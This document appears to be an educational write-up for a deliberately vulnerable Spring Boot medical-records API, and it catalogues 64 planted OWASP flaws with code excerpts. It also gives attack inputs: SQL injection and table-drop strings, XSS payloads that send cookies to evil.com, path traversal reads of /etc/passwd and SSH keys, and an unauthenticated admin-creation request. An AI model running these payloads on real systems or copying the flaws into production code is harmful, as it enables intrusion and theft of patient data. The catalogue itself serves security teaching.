# Vulnerable Configuration — MediConnect API

Branch: `vulnerable` | Purpose: OWASP Top 10 education / attack demonstration

---

## Added Files

### `docker-compose.yml`

Starts the local environment with two services:

| Service | Image | Port | Credentials |
|---|---|---|---|
| MySQL 8.0 | `mysql:8.0` | `3306` | root / root |
| phpMyAdmin | `phpmyadmin:latest` | `8082` | root / root |

```bash
docker-compose up -d
```

---

### `src/main/resources/application.yaml`

Full application configuration with intentional vulnerabilities marked `[A02]`.

#### Vulnerabilities

**1. Hardcoded database credentials [A02]**
```yaml
datasource:
  username: root
  password: root
```
Password visible in a plain-text configuration file committed to the repository.

---

**2. SQL schema leakage via logs [A02]**
```yaml
jpa:
  show-sql: true
  properties:
    hibernate:
      format_sql: true
logging:
  level:
    org.hibernate.SQL: DEBUG
    org.hibernate.type.descriptor.sql.BasicBinder: TRACE
```
Complete SQL queries with bound parameters are printed to logs — reveals database schema and data.

---

**3. Destructive schema changes [A02]**
```yaml
jpa:
  hibernate:
    ddl-auto: update
```
Hibernate automatically alters the database schema on startup — risk of data loss, bypasses Flyway migration control.

---

**4. Actuator endpoints publicly exposed [A02]**
```yaml
management:
  endpoints:
    web:
      exposure:
        include: '*'
  endpoint:
    health:
      show-details: always
    env:
      show-values: always
```
All Actuator endpoints accessible without authentication:
- `/actuator/env` — environment variables and passwords
- `/actuator/heapdump` — full JVM process memory dump
- `/actuator/beans` — internal Spring application context
- `/actuator/mappings` — all registered URL routes

---

**5. Stack trace exposed to client [A02]**
```yaml
server:
  error:
    include-stacktrace: always
    include-message: always
    include-exception: true
```
Internal Java stack trace returned in HTTP error responses — reveals file paths, class names and library versions.

---

**6. Thymeleaf cache disabled [A02]**
```yaml
thymeleaf:
  cache: false
```
Supports exploration of Server-Side Template Injection (SSTI) vulnerabilities.

---

## Flyway Migrations — `src/main/resources/db/migration/`

### Table Schema

| Migration | Table | Description |
|---|---|---|
| V1 | `users` | username, email, password_hash, role, active, failed_login_attempts, locked_until |
| V2 | `patients` | user_id FK, insurance_number, date_of_birth, blood_type, allergies, emergency_contact |
| V3 | `doctors` | user_id FK, specialty, license_number, hospital, phone, bio |
| V4 | `appointments` | patient_id FK, doctor_id FK, status ENUM, requested_date, notes |
| V5 | `medical_records` | patient_id FK, doctor_id FK, diagnosis, prescription, attachment_path |
| V6 | `lab_results` | patient_id FK, lab_tech_id FK, test_name, result_value, status ENUM |
| V7 | `prescriptions` | medical_record_id FK, medication_name, dosage, status ENUM, dispensed_at |
| V8 | `messages` | sender_id FK, receiver_id FK, content TEXT, sent_at, read_at |
| V9 | `audit_logs` | user_id FK, action, entity_type, ip_address, user_agent, details |
| V10 | seed data | admin + patient1 + doctor1 with MD5 passwords |

### Vulnerabilities in Migrations

**7. PII stored as plaintext without encryption [A04] — V2**
```sql
insurance_number  VARCHAR(50),
date_of_birth     DATE,
blood_type        VARCHAR(5),
allergies         TEXT,
emergency_contact VARCHAR(255)
```
Sensitive patient health data stored unencrypted — directly readable from the database.

---

**8. No content_hash for medical records [A08] — V5**
```sql
-- content_hash column intentionally omitted
attachment_path VARCHAR(500)
```
Without a hash it is impossible to detect tampering with attached files or verify the integrity of diagnoses and prescriptions.

---

**9. Stored XSS — messages.content without sanitization [A05] — V8**
```sql
content TEXT  -- raw HTML/JS, no escaping
```
Stored content is displayed without processing — an attacker can inject a `<script>` tag that executes for every recipient.

---

**10. MD5 seed passwords without salt [A02] — V10**
```sql
-- admin123  → MD5 → 0192023a7bbd73250516f069df18b500
-- 12345     → MD5 → 827ccb0eea8a706c4c34a16891f84e7b
-- password  → MD5 → 5f4dcc3b5aa765d61d8327deb882cf99
```
All three values exist in public rainbow tables — passwords are trivially recoverable.

---

## JPA Entities, Repositories and DTOs

### New Files

| Package | Files |
|---|---|
| `com.mediconnect.enums` | `Role`, `AppointmentStatus`, `LabResultStatus`, `PrescriptionStatus` |
| `com.mediconnect.entity` | `User`, `Patient`, `Doctor`, `Appointment`, `MedicalRecord`, `LabResult`, `Prescription`, `Message`, `AuditLog` |
| `com.mediconnect.repository` | One repository per entity with custom query methods |
| `com.mediconnect.dto` | One DTO per entity — same for request and response |

`MediconnectApiApplication` updated with `scanBasePackages`, `@EntityScan` and `@EnableJpaRepositories` for `com.mediconnect`.

### Vulnerabilities

**11. passwordHash exposed in API response [A04] — `User.java`, `UserDto.java`**
```java
// No @JsonIgnore — password hash returned in every GET /users/{id} response
private String passwordHash;
```

---

**12. PII fields exposed in API response without masking [A04] — `Patient.java`, `PatientDto.java`**
```java
// All fields returned as plain text — insurance, DOB, blood type, allergies
private String insuranceNumber;
private LocalDate dateOfBirth;
private String bloodType;
private String allergies;
private String emergencyContact;
```

---

**13. Mass Assignment — same DTO for request and response [A07] — all `*Dto.java`**

Examples of privileged fields a client can set:

| DTO | Dangerous field | Effect |
|---|---|---|
| `UserDto` | `role`, `active`, `failedLoginAttempts`, `lockedUntil` | Privilege escalation, account unban |
| `PatientDto` | `userId` | Profile hijacking |
| `AppointmentDto` | `status` | Direct appointment approval |
| `PrescriptionDto` | `status`, `pharmacistId` | Fraudulent medication dispensing |
| `MessageDto` | `senderId` | Message sender spoofing |
| `AuditLogDto` | `userId`, `ipAddress` | Audit trail manipulation |

---

**14. XSS — `Message.content` without sanitization [A05] — `Message.java`, `MessageDto.java`**
```java
// Content stored and returned without processing — Stored XSS
private String content;
```

---

**15. File integrity unverifiable [A08] — `MedicalRecord.java`, `MedicalRecordDto.java`**
```java
// No contentHash — attachment tampering is undetectable
private String attachmentPath;
```

---

## Security Layer — `JwtUtil`, `PasswordUtils`, `SecurityConfig`

### New Files

| File | Description |
|---|---|
| `security/JwtUtil.java` | JWT token generation and validation |
| `security/PasswordUtils.java` | MD5 password hashing without salt |
| `security/SecurityConfig.java` | Spring Security configuration — all endpoints open |

`pom.xml`: added `spring-boot-starter-security`.

### Vulnerabilities

**16. Hardcoded JWT secret in source code [A02][A04] — `JwtUtil.java`**
```java
private static final String SECRET = "mediconnect-super-secret-2024";
```
Visible in the repository — anyone can sign arbitrary tokens (e.g. `"role": "ADMIN"`).

---

**17. JWT key below 256 bits — WeakKeyException bypassed [A02] — `JwtUtil.java`**
```java
byte[] keyBytes = Arrays.copyOf(SECRET.getBytes(StandardCharsets.UTF_8), 32);
return new SecretKeySpec(keyBytes, "HmacSHA256"); // zero-padding instead of a strong key
```
JJWT's minimum key length check bypassed by manually padding the key with zero bytes.

---

**18. JWT token valid for 30 days [A07] — `JwtUtil.java`**
```java
private static final long EXPIRATION_MS = 30L * 24 * 60 * 60 * 1000;
```
720-hour attack window — a stolen token remains valid for a very long time. Recommended: 15–60 minutes.

---

**19. Algorithm Confusion attack [A07] — `JwtUtil.java`**
```java
// No requireAlgorithm() or allowedAlgorithms() — parser accepts alg from the header
Jwts.parser().verifyWith(...).build().parseSignedClaims(token)
```
An attacker can attempt to replace the `alg` header (`"none"`, `"RS256"`) to bypass signature verification. Further amplified by JJWT CVE-2024-31033 (version 0.12.3 in pom.xml).

---

**20. MD5 without salt — rainbow table attack [A04] — `PasswordUtils.java`**
```java
MessageDigest.getInstance("MD5")  // no salt, no iterations
```
Identical passwords → identical hashes. Billions of MD5 hashes available in public rainbow tables.

---

**21. Timing attack on password comparison [A04] — `PasswordUtils.java`**
```java
return hashPassword(rawPassword).equals(hashedPassword); // not timing-safe
```
`String.equals()` returns `false` as soon as it finds the first differing character — response-time measurement can reveal correct characters.

---

**22. All endpoints unauthenticated [A01] + CSRF disabled [A04] — `SecurityConfig.java`**
```java
.csrf(AbstractHttpConfigurer::disable)
.authorizeHttpRequests(auth -> auth.anyRequest().permitAll())
```
No endpoint requires authentication. CSRF protection and security headers (HSTS, CSP, X-Frame-Options) disabled.

---

## Auth Controller — `AuthController`, `AuthService`, `RegisterRequest`, `LoginRequest`, `UserPrincipal`

### New Files

| File | Description |
|---|---|
| `dto/RegisterRequest.java` | username, email, password, role — no validation |
| `dto/LoginRequest.java` | username, password |
| `security/UserPrincipal.java` | `UserDetails` wrapper around `User` entity for `JwtUtil` |
| `service/AuthService.java` | Registration and login logic with intentional vulnerabilities |
| `controller/AuthController.java` | `POST /api/auth/register`, `POST /api/auth/login` |

### Vulnerabilities

**23. Mass Assignment — role taken directly from request body [A07]**
```java
// RegisterRequest.java
private String role;  // client sends "ADMIN" → receives an admin account

// AuthService.java
.role(Role.valueOf(request.getRole()))  // no server-side validation
```

---

**24. No password complexity validation [A07]**
```java
// RegisterRequest.java — no @Size, @Pattern, @NotBlank
private String password;
// Accepted: {"password": "1"}
```

---

**25. User Enumeration — three semantically distinct error messages [A07]**
```java
// AuthService.java — each message reveals different information to the attacker
throw new RuntimeException("User not found: " + username);         // username does not exist
throw new RuntimeException("Invalid password");                    // username exists
throw new RuntimeException("Account is locked until " + time);    // exists + password correct
```

---

**26. JWT in response body — not in HttpOnly cookie [A04]**
```java
// AuthController.java — token accessible to JavaScript
return ResponseEntity.ok(Map.of("token", token));
```
Correct approach: `Set-Cookie: token=...; HttpOnly; Secure; SameSite=Strict`

---

**27. No rate limiting on /login [A07]**

Endpoint `POST /api/auth/login` has no protection against brute-force or credential stuffing attacks — unlimited attempts, no lockout, no CAPTCHA, no IP throttling.

---

## Security Infrastructure — `SecurityConfig`, `JwtAuthenticationFilter`, `CustomUserDetailsService`

### New Files

| File | Description |
|---|---|
| `security/CustomUserDetailsService.java` | `UserDetailsService` implementation — loads `User` from DB, wraps in `UserPrincipal` |
| `security/JwtAuthenticationFilter.java` | `OncePerRequestFilter` — reads JWT from `Authorization` header, sets `SecurityContext` |
| `security/SecurityConfig.java` | Full Spring Security config replacing the earlier stub |

### Vulnerabilities

**28. CSRF fully disabled [A01] — `SecurityConfig.java`**
```java
.csrf(AbstractHttpConfigurer::disable)
```
Any cross-origin POST/PUT/DELETE request executes without a CSRF token.

---

**29. Admin routes open to all — no role check [A01] — `SecurityConfig.java`**
```java
.requestMatchers("/api/admin/**").permitAll()  // should be hasRole("ADMIN")
```
Any unauthenticated request reaches admin endpoints without authentication or authorization.

---

**30. Wildcard CORS policy [A05] — `SecurityConfig.java`**
```java
config.setAllowedOrigins(List.of("*"));   // any domain
config.setAllowedMethods(List.of("*"));   // GET, POST, DELETE, PATCH...
config.setAllowedHeaders(List.of("*"));   // Authorization, Cookie, X-Custom-*
```
Any attacker-controlled domain can make authenticated cross-origin requests to the API.

---

**31. All security response headers disabled [A02] — `SecurityConfig.java`**
```java
.headers(AbstractHttpConfigurer::disable)
```
Removes: `Strict-Transport-Security`, `X-Frame-Options` (clickjacking), `X-Content-Type-Options` (MIME sniffing), `Content-Security-Policy`, `Referrer-Policy`.

---

**32. `NoOpPasswordEncoder` registered — plain-text comparison path [A02] — `SecurityConfig.java`**
```java
return NoOpPasswordEncoder.getInstance();
```
The `DaoAuthenticationProvider` internal path compares passwords without hashing. The stored MD5 hex strings are treated as the "plain-text" password.

---

**33. Token expiry skipped for specific paths [A07] — `JwtAuthenticationFilter.java`**
```java
private static final List<String> SKIP_EXPIRY_PATHS = List.of(
    "/api/public/", "/api/legacy/", "/api/reports/"
);
// For matching paths: setAuthentication() called without validateToken()
```
Expired tokens (e.g. from months ago) are fully accepted on these routes.

---

**34. Token parsing exceptions silently swallowed [A07] — `JwtAuthenticationFilter.java`**
```java
} catch (Exception e) {
    // swallowed — request continues as unauthenticated
}
```
Malformed, tampered or otherwise invalid tokens produce no error response. Combined with `permitAll()`, the request still reaches the controller.

---

**35. User Enumeration in `UserDetailsService` [A07] — `CustomUserDetailsService.java`**
```java
throw new UsernameNotFoundException("User not found: " + username);
```
With `server.error.include-message=always` set in `application.yaml`, this message reaches the HTTP response and confirms whether a username exists.

---

---

## User Controller — `UserController`, `UserService`

### New Files

| File | Description |
|---|---|
| `controller/UserController.java` | `GET /api/users`, `GET /{id}`, `PUT /{id}/role`, `GET /delete/{id}` |
| `service/UserService.java` | CRUD operations: `findAll`, `findById`, `updateRole`, `deleteById` |

### Vulnerabilities

**36. IDOR — GET /api/users/{id} without authorization check [A01] — `UserController.java`**
```java
// [A01] No check that the caller owns or is authorized to view this id
@GetMapping("/{id}")
public ResponseEntity<UserDto> getUserById(@PathVariable Long id) {
    return ResponseEntity.ok(userService.findById(id));
}
```
Patient A can retrieve the full profile of Patient B (including `passwordHash`, `role`, `failedLoginAttempts`, `lockedUntil`) without any authorization. The requested `id` is never compared against the identity in the JWT token.

---

**37. passwordHash exposed in API response [A04] — `UserService.java`, `UserDto.java`**
```java
// UserService.toDto() — explicitly maps hash into the response
.passwordHash(user.getPasswordHash())   // [A04] exposed

// UserDto.java — no @JsonIgnore
private String passwordHash;
```
Every GET response includes the MD5 password hash. An attacker who obtains the hash can immediately look it up in public rainbow tables.

---

**38. Mass Assignment — PUT /api/users/{id}/role accepts role without server-side validation [A01] — `UserController.java`**
```java
@PutMapping("/{id}/role")
public ResponseEntity<UserDto> updateUserRole(
        @PathVariable Long id,
        @RequestBody Map<String, String> body) {
    String role = body.get("role");   // taken directly from the request body
    return ResponseEntity.ok(userService.updateRole(id, role));
}
```
```java
// UserService.java — no whitelist, no check of the caller's own role
user.setRole(Role.valueOf(role));  // {"role":"ADMIN"} → privilege escalation
```
Any user (or unauthenticated caller, given `permitAll()`) can send `{"role":"ADMIN"}` and promote any account to administrator.

---

**39. DELETE operation implemented as @GetMapping [A07] — `UserController.java`**
```java
// [A07] GET /api/users/delete/{id} — destructive operation via an idempotent HTTP method
@GetMapping("/delete/{id}")
public ResponseEntity<Void> deleteUser(@PathVariable Long id) {
    userService.deleteById(id);
    return ResponseEntity.noContent().build();
}
```
GET is idempotent and cached by browsers, proxies, and CDNs. An attacker can trick a victim into deleting a user account with a simple `<img src="https://api.mediconnect.com/api/users/delete/5">` tag — no CSRF token required.

---

**40. GET /api/users returns all users to all roles [A01] — `UserController.java`**
```java
// [A01] No role check — PATIENT, DOCTOR, LAB_TECH, PHARMACIST, and unauthenticated
//        callers all receive the complete user list including passwordHash
@GetMapping
public ResponseEntity<List<UserDto>> getAllUsers() {
    return ResponseEntity.ok(userService.findAll());
}
```
The endpoint verifies neither the role nor the identity of the caller. The full user list (including password hashes) is available without any authentication.

---

## Appointment Controller — `AppointmentController`, `AppointmentService`

### New Files

| File | Description |
|---|---|
| `controller/AppointmentController.java` | `GET /api/appointments`, `GET /{id}`, `PUT /{id}/status`, `GET /{id}/pdf`, `POST /` |
| `service/AppointmentService.java` | `searchAppointments` (SQLi), `findById` (IDOR), `updateStatus` (no state machine), `generatePdf` (no checksum), `create` |

### Vulnerabilities

**41. SQL Injection — GET /api/appointments?doctorName= [A05] — `AppointmentService.java`**
```java
// [A05] Direct string concatenation — no PreparedStatement placeholder
String sql = "SELECT a.id, a.patient_id, a.doctor_id, a.status, " +
             "       a.requested_date, a.notes, a.created_at " +
             "FROM appointments a " +
             "JOIN doctors d ON a.doctor_id = d.id " +
             "JOIN users u ON d.user_id = u.id " +
             "WHERE u.username LIKE '%" + doctorName + "%'";
jdbcTemplate.query(sql, rowMapper);
```
Attack examples:
- `?doctorName=' OR '1'='1` → returns all appointments without any filter
- `?doctorName=' UNION SELECT username,password_hash,3,4,5,6,7 FROM users --` → dumps the users table through the appointment response
- `?doctorName='; DROP TABLE appointments; --` → table destruction

---

**42. IDOR — GET /api/appointments/{id} without ownership check [A01] — `AppointmentController.java`**
```java
// [A01] No comparison of the appointment id against the caller's identity
@GetMapping("/{id}")
public ResponseEntity<AppointmentDto> getAppointmentById(@PathVariable Long id) {
    return ResponseEntity.ok(appointmentService.findById(id));
}
```
Patient A can retrieve Patient B's appointment by iterating ID values. There is no check that the user in the token is actually the patient or the doctor on that specific appointment.

---

**43. Missing state machine — PUT /api/appointments/{id}/status [A06] — `AppointmentService.java`**
```java
// [A06] No check of the previous state, no role enforcement
// Allowed business transitions: REQUESTED → APPROVED → COMPLETED
//                               REQUESTED → CANCELLED
// What this enables:
//   COMPLETED → REQUESTED  (re-opens a finished appointment)
//   CANCELLED → APPROVED   (approves a cancelled slot)
//   COMPLETED → APPROVED   (billing fraud — re-approves a completed visit)
appointment.setStatus(AppointmentStatus.valueOf(status));
```
A patient can send `{"status":"APPROVED"}` and approve their own appointment. An attacker can exploit `COMPLETED → APPROVED` for billing manipulation.

---

**44. PDF served without Content-MD5 or checksum [A08] — `AppointmentController.java`**
```java
// [A08] Content-MD5 intentionally omitted
// Secure implementation would add:
//   headers.set("Content-MD5", Base64.getEncoder().encodeToString(
//       MessageDigest.getInstance("MD5").digest(pdfBytes)));
return ResponseEntity.ok()
        .headers(headers)   // no Content-MD5, no content-hash-based ETag
        .body(pdfBytes);
```
Medical PDF documents (diagnosis, medication, appointment date) are served without any integrity control. A MITM attacker or a compromised CDN can silently modify the document and the client has no mechanism to detect the tampering.

---

## Medical Record Controller — `MedicalRecordController`, `MedicalRecordService`

### New Files

| File | Description |
|---|---|
| `controller/MedicalRecordController.java` | `POST /api/medical-records`, `GET /{id}`, `POST /{id}/attachment`, `GET /{id}/attachment` |
| `service/MedicalRecordService.java` | `create` (A01), `uploadAttachment` (A03+A08), `downloadAttachment` (A03), `findById`, `findByPatientId` |

### Vulnerabilities

**45. Broken Access Control — POST /api/medical-records without doctor-patient assignment check [A01] — `MedicalRecordService.java`**
```java
// [A01] No verification that the doctor has any relationship with the patient
// Missing: appointmentRepository.existsByDoctorIdAndPatientId(doctorId, patientId)
// Missing: care-plan membership check
MedicalRecord record = MedicalRecord.builder()
        .patient(patient)   // any patient
        .doctor(doctor)     // any doctor
        ...
        .build();
```
Doctor D can create a medical record for Patient P with whom they have never had an appointment. An attacker with the DOCTOR role can fabricate medical records for any user in the system.

---

**46. Unrestricted File Upload — POST /api/medical-records/{id}/attachment [A03] — `MedicalRecordService.java`**
```java
// [A03] No extension, MIME type, magic-byte, or file-size validation
String filename = file.getOriginalFilename();   // fully controlled by the attacker
String storagePath = uploadDir + filename;       // direct concatenation
Path destination = Paths.get(storagePath);
Files.copy(file.getInputStream(), destination, StandardCopyOption.REPLACE_EXISTING);
```
Accepted uploads: `.php`, `.jsp`, `.sh`, `.exe`, `application/octet-stream`, `text/html`. If the server runs PHP/CGI, an attacker can achieve remote code execution by uploading a web shell.

---

**47. Path Traversal (write) — getOriginalFilename() without sanitization [A03] — `MedicalRecordService.java`**
```java
// Attacker sends: filename = "../../etc/cron.d/backdoor"
// storagePath   = "/tmp/mediconnect/uploads/../../etc/cron.d/backdoor"
// After resolution → writes to /etc/cron.d/backdoor
String storagePath = uploadDir + filename;   // [A03] no normalize(), no startsWith() check
```
Combined with `REPLACE_EXISTING`, an attacker can overwrite system files (cron jobs, SSH authorized_keys, /etc/passwd) if the JVM process has sufficient permissions.

---

**48. Path Traversal (read) — filePath query parameter without canonical validation [A03] — `MedicalRecordController.java`, `MedicalRecordService.java`**
```java
// GET /api/medical-records/1/attachment?filePath=/etc/passwd
// GET /api/medical-records/1/attachment?filePath=../../../root/.ssh/id_rsa
// GET /api/medical-records/1/attachment?filePath=/proc/self/environ

// MedicalRecordService.downloadAttachment():
Path path = Paths.get(filePath);      // [A03] verbatim — no boundary check
return Files.readAllBytes(path);      // reads any file accessible to the JVM process
```
No comparison against `uploadDir`, no `toAbsolutePath().normalize().startsWith(base)` check. An attacker can read arbitrary files from the server, including configuration files, private keys, and user data.

---

**49. Filesystem path returned in response [A02] — `MedicalRecordController.java`**
```java
return ResponseEntity.ok(Map.of("path", storedPath));
// Response: {"path": "/tmp/mediconnect/uploads/report.pdf"}
```
The full server-side filesystem path is returned to the client, revealing the directory structure and aiding path traversal payload construction.

---

**50. content_hash not computed at upload time [A08] — `MedicalRecordService.java`**
```java
Files.copy(file.getInputStream(), destination, StandardCopyOption.REPLACE_EXISTING);
// Secure: String hash = DigestUtils.sha256Hex(file.getBytes());
//         record.setContentHash(hash);   // MedicalRecord entity has no such field
```
Neither the `MedicalRecord` entity nor migration `V5` contain a `content_hash` column. Any subsequent modification of a medical document (diagnosis, medication dosage) is completely undetectable.

---

## Lab Result Controller — `LabResultController`, `LabResultService`

### New Files

| File | Description |
|---|---|
| `controller/LabResultController.java` | `GET /api/lab-results/search`, `GET /{id}`, `POST /{id}/file`, `GET /{id}/file`, `POST /` |
| `service/LabResultService.java` | `searchLabResults` (4×SQLi), `findById` (IDOR), `saveAttachment` (A03), `downloadFile` (A03) |

### Vulnerabilities

**51. SQL Injection — GET /api/lab-results/search with 4 parameters [A05] — `LabResultService.java`**

Three string parameters (concatenation inside single quotes):
```java
"WHERE lr.test_name       LIKE '%" + testName + "%' " +   // [A05] string injection
"AND   lr.reference_range LIKE '%" + testCode + "%' " +   // [A05] string injection
"AND   lr.status          LIKE '%" + status   + "%' " +   // [A05] string injection
```
Attack examples:
- `?testName=' OR '1'='1` → returns all lab results
- `?status=' UNION SELECT username,password_hash,3,4,5,6,7,8,9,10,11 FROM users --` → dumps the users table

Numeric parameter `patientId` — **no surrounding quotes (UNION attack without closing a string)**:
```java
"AND   lr.patient_id = " + patientId   // [A05] numeric — attacker never needs to close a quote
```
Attack:
```
?patientId=0 UNION SELECT id,patient_id,lab_tech_id,test_name,
             password_hash,email,NULL,role,NOW(),notes,NULL
             FROM users u JOIN patients p ON u.id=p.user_id --
```
Dumps the `users` table through the `resultValue`/`unit` response fields without any string escaping. This is the most dangerous form of SQL injection because the WHERE clause appears "safe" to a developer who assumes numeric values cannot be an injection vector.

---

**52. IDOR — GET /api/lab-results/{id} without ownership check [A01] — `LabResultController.java`**
```java
// [A01] No check that the caller is the patient who owns the result
//        or the doctor who ordered the test
@GetMapping("/{id}")
public ResponseEntity<LabResultDto> getById(@PathVariable Long id) {
    return ResponseEntity.ok(labResultService.findById(id));
}
```
By iterating IDs (`/api/lab-results/1`, `/2`, `/3`...) an attacker can retrieve lab results for all patients, including diagnoses, result values, and reference ranges.

---

**53. Unrestricted File Upload + predictable filename [A03] — `LabResultService.java`**
```java
// [A03] getOriginalFilename() — fully controlled by the attacker
String filename    = file.getOriginalFilename();   // e.g. "bloodwork.pdf" — always the same
String storagePath = uploadDir + filename;          // no UUID prefix, no randomization
Files.copy(file.getInputStream(), destination, StandardCopyOption.REPLACE_EXISTING);
```
Issues:
1. **Predictable filename** — the attacker knows the full path as soon as they know the naming convention; `REPLACE_EXISTING` allows overwriting legitimate files
2. **Unrestricted extension** — `.php`, `.jsp`, `.sh`, `.exe` accepted without validation
3. **Path Traversal write** — `filename = "../../etc/cron.d/backdoor"` writes outside `uploadDir`

---

**54. Path Traversal (read) — GET /api/lab-results/{id}/file?filePath= [A03] — `LabResultService.java`**
```java
// [A03] filePath — taken verbatim from the query parameter, no boundary check
Path path = Paths.get(filePath);
return Files.readAllBytes(path);   // reads any file accessible to the JVM process
```
Attack examples:
```
GET /api/lab-results/1/file?filePath=/etc/passwd
GET /api/lab-results/1/file?filePath=/proc/self/environ          → exposes DB password from env
GET /api/lab-results/1/file?filePath=../../../root/.ssh/id_rsa
GET /api/lab-results/1/file?filePath=/tmp/mediconnect/uploads/../../application.yaml
```
No `toAbsolutePath().normalize().startsWith(base)` check. No comparison of `filePath` against the stored `lr.attachmentPath`.

---

## Message Controller — `MessageController`, `MessageService`

### New Files

| File | Description |
|---|---|
| `controller/MessageController.java` | `POST /api/messages`, `GET /conversation/{userId}`, `DELETE /{id}`, `GET /inbox/{userId}`, `PATCH /{id}/read` |
| `service/MessageService.java` | `send` (Stored XSS + sender spoofing), `getConversation` (IDOR), `deleteById` (no ownership check) |

### Vulnerabilities

**55. Stored XSS — POST /api/messages stores content without sanitization [A05] — `MessageService.java`**
```java
// [A05] content stored verbatim — <script>, <img onerror=>, <svg onload=> all pass through
Message message = Message.builder()
        .sender(sender)
        .receiver(receiver)
        .content(dto.getContent())   // no Jsoup.clean(), no HTML encoding
        .sentAt(LocalDateTime.now())
        .build();
```
Attack payloads that execute in every recipient's browser:
```json
{"content": "<script>document.location='https://evil.com/?c='+document.cookie</script>"}
{"content": "<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>"}
{"content": "<svg onload=eval(atob('base64_payload'))>"}
```
Enables cookie theft, session hijacking, keylogging, and crypto-mining delivery via a single stored message.

---

**56. Sender spoofing — senderId taken from request body [A07] — `MessageService.java`**
```java
// [A07] senderId is not taken from the JWT SecurityContext
User sender = userRepository.findById(dto.getSenderId())...
// Attacker sends: {"senderId": 5, "receiverId": 2, "content": "..."} → message appears as user 5
```
Any caller can send a message that appears to originate from any other user in the system.

---

**57. IDOR — GET /api/messages/conversation/{userId} without participant check [A01] — `MessageController.java`**
```java
// [A01] viewerId is a query parameter — never verified against the authenticated principal
@GetMapping("/conversation/{userId}")
public ResponseEntity<List<MessageDto>> getConversation(
        @PathVariable Long userId,
        @RequestParam Long viewerId) {
    return ResponseEntity.ok(messageService.getConversation(viewerId, userId));
}
```
Attack:
```
GET /api/messages/conversation/2?viewerId=1  → reads the private conversation between user 1 and user 2
GET /api/messages/conversation/3?viewerId=1  → reads the private conversation between user 1 and user 3
```
By iterating `userId`, an attacker can harvest all private medical conversations in the system.

---

**58. Broken Access Control — DELETE /api/messages/{id} without ownership check [A01] — `MessageService.java`**
```java
// [A01] Missing: if (!message.getSender().getId().equals(currentUserId)) throw Forbidden
messageRepository.findById(id)
        .orElseThrow(() -> new RuntimeException("Message not found: " + id));
messageRepository.deleteById(id);   // deletes any message regardless of caller identity
```
Any caller can delete any message in the system. Combined with `SecurityConfig.permitAll()`, no authentication is required.

---

## Prescription Controller — `PrescriptionController`, `PrescriptionService`

### New Files

| File | Description |
|---|---|
| `controller/PrescriptionController.java` | `POST /api/prescriptions`, `GET /{id}`, `PUT /{id}/dispense`, `PUT /{id}/status` |
| `service/PrescriptionService.java` | `dispense` (no state machine), `updateStatus` (any transition allowed), `create`, `findById`, `findByPatientId` |

### Vulnerabilities

**59. Missing state machine — PUT /api/prescriptions/{id}/dispense allows double dispensing [A06] — `PrescriptionService.java`**
```java
// [A06] No status guard before dispensing
// Allowed business transition: CREATED → DISPENSED (once)
// What this allows:
//   DISPENSED → DISPENSED  (double dispensing — duplicate drug supply / billing fraud)
//   CANCELLED → DISPENSED  (dispensing a voided prescription — pharmaceutical fraud)
prescription.setStatus(PrescriptionStatus.DISPENSED);
prescription.setPharmacist(pharmacist);
prescription.setDispensedAt(LocalDateTime.now());   // overwrites even if already DISPENSED
```
A prescription that has already been dispensed can be dispensed again without any error. This enables duplicate medication supply and double-billing attacks.

---

**60. Missing state machine — PUT /api/prescriptions/{id}/status allows any transition [A06] — `PrescriptionService.java`**
```java
// [A06] PrescriptionStatus.valueOf() accepts any valid enum string
//        without checking the current state or the allowed transition graph
prescription.setStatus(PrescriptionStatus.valueOf(status));
```
Illegal transitions enabled:

| From | To | Attack |
|---|---|---|
| `DISPENSED` | `CREATED` | Re-opens a dispensed prescription for re-use |
| `DISPENSED` | `CANCELLED` | Erases the dispensing audit trail after medication is issued |
| `CANCELLED` | `DISPENSED` | Dispenses a voided prescription |
| `CANCELLED` | `CREATED` | Reactivates a void prescription |

---

**61. Pharmacist identity not verified — PUT /{id}/dispense [A07] — `PrescriptionController.java`**
```java
// [A07] pharmacistId taken from request body — no role or identity check
@PutMapping("/{id}/dispense")
public ResponseEntity<PrescriptionDto> dispense(
        @PathVariable Long id,
        @RequestBody Map<String, Long> body) {
    Long pharmacistId = body.get("pharmacistId");   // attacker supplies any userId
    return ResponseEntity.ok(prescriptionService.dispense(id, pharmacistId));
}
```
An attacker can attribute a dispensing event to any user by supplying an arbitrary `pharmacistId`. No check that the referenced user actually holds the `PHARMACIST` role or that the caller is the pharmacist performing the action.

---

## Admin Controller — `AdminController`, `AdminService`

### New Files

| File | Description |
|---|---|
| `controller/AdminController.java` | `GET /api/admin/users`, `POST /api/admin/users`, `GET /api/admin/config`, `POST /api/admin/logs/clear`, `GET /api/admin/logs` |
| `service/AdminService.java` | `getAllUsers` (A01), `createUser` (A07 Mass Assignment), `getConfig` (A02 env exposure), `clearAllLogs` (A09), `getAllLogs` (A01) |

### Vulnerabilities

**62. Broken Access Control — GET /api/admin/users accessible without ADMIN role [A01] — `AdminController.java`**
```java
// [A01] No @PreAuthorize, no manual role check
// SecurityConfig maps /api/admin/** to permitAll() — no token required at all
@GetMapping("/users")
public ResponseEntity<List<UserDto>> getAllUsers() {
    return ResponseEntity.ok(adminService.getAllUsers());
}
```
Any caller — unauthenticated, PATIENT, LAB_TECH — receives the full user list including `passwordHash`, `failedLoginAttempts`, and `lockedUntil`. The `SecurityConfig.permitAll()` on `/api/admin/**` means no JWT is required even for admin-prefixed routes.

---

**63. Mass Assignment — POST /api/admin/users creates accounts with any role [A07] — `AdminService.java`**
```java
// [A07] role taken verbatim from the request body — no whitelist, no enforcement
String rawRole = body.getOrDefault("role", "PATIENT");
User user = User.builder()
        ...
        .role(Role.valueOf(rawRole))   // {"role":"ADMIN"} → fully privileged account
        .build();
```
Attack — create an ADMIN account without any token:
```json
POST /api/admin/users
{"username":"attacker","email":"att@evil.com","password":"pass","role":"ADMIN"}
```
Since `/api/admin/**` is `permitAll()`, the attacker does not need an existing ADMIN session. One unauthenticated request yields a permanent privileged account.

---

**64. Sensitive Data Exposure — GET /api/admin/config returns raw Environment [A02] — `AdminService.java`**
```java
// [A02] Iterates all EnumerablePropertySource instances — includes application.yaml,
//        OS environment variables, and JVM system properties
environment.getPropertySources().stream()
        .filter(ps -> ps instanceof EnumerablePropertySource)
        .map(ps -> (EnumerablePropertySource<?>) ps)
        .forEach(ps -> Arrays.stream(ps.getPropertyNames())
                .forEach(name -> props.put(name, ps.getProperty(name))));
```
All values are returned as plain text with **no redaction**. Exposed secrets include:

| Property | Value example |
|---|---|
| `spring.datasource.password` | `root` |
| `spring.datasource.url` | `jdbc:mysql://localhost:3306/mediconnect_db` |
